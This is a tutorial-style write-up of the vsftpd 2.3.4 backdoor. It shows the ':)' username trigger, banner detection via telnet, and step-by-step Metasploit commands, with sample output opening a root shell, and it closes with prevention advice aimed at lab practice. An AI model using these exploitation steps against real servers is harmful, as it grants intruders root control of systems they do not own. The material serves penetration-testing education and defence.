# VSFTPD 2.3.4 Exploit Documentation

## üîç What is vsftpd?

**VSFTPD** stands for **Very Secure FTP Daemon**. It is a fast, stable, and secure FTP server for Unix systems.

* **Author:** Chris Evans
* **Primary Goals:** Speed, Security, and Stability
* **Common Usage:** Installed as the default FTP server in many Linux distributions

---

## üîé Vulnerable Version: `vsftpd 2.3.4`

* **Release Date:** June 2011
* **Type of Issue:** Backdoor
* **Cause:** Compromised unofficial source mirror (not a vulnerability in the original author's code)

A malicious attacker added a backdoor to the source code hosted on an unofficial mirror. This backdoor allows unauthorized remote command execution when triggered.

---

## üß† How the Backdoor Works

The backdoor is triggered when a user connects via FTP and uses a \*\*username ending in \*\*\`\`.

### Example:

```bash
ftp <target-ip>
Name: backdoor:)
```

When the above is done:

* The vsftpd server spawns a shell on port `6200`
* This shell has **root privileges**, allowing full control over the system

---

## üí™ Detection

To detect if a server is running the vulnerable version:

```bash
telnet <target-ip> 21
```

Output should show:

```
220 (vsFTPd 2.3.4)
```

---

## üöÄ Exploitation using Metasploit

### 1. Start Metasploit and load the module:

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
```

### 2. Set the target IP address:

```bash
msf6 exploit(...) > set RHOSTS <target-ip>
```

### 3. Run the exploit:

```bash
msf6 exploit(...) > run
```

### 4. Successful Exploit Output:

```
[+] 192.168.56.102:21 - Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (...)
```

You now have an interactive root shell session on the target machine.

---

## üîê Patch & Prevention

* **vsftpd 2.3.4 has been deprecated** and should not be used.
* Always use **official and trusted repositories** for downloading software.
* Use modern secure alternatives like **SFTP** instead of FTP.
* Monitor services listening on uncommon ports (like `6200`) and restrict network access via firewalls.

---

## üöß Conclusion

The vsftpd 2.3.4 vulnerability is an example of how a compromised distribution source can introduce severe security flaws, even in highly trusted software. Understanding and practicing this exploit in a controlled environment (like Metasploitable2) is crucial for security professionals and students to learn penetration testing techniques.

---
